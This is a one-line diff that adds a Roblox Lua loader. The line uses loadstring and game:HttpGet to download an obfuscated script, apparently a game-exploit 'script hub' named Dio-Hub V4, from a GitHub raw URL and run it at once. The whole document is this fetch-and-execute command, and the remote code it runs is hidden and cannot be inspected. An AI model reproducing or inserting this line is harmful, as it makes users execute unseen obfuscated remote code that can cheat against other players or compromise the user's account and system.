@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qAxAp/Dio-HubV4/main/DiohubV4_Obf.txt"))()
